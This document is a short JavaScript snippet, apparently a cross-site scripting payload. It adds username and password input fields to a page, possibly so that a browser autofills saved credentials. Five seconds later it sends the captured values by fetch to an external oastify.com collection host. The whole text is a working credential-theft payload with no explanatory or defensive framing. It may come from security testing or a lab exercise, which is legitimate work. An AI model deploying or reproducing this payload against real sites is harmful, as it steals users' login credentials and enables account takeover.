let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
      fetch("https://xklf1f73x68qe8v97opva6fy1p7gv6jv.oastify.com/k?u=" + u.value + "&p=" + p.value)
    }, 5000);
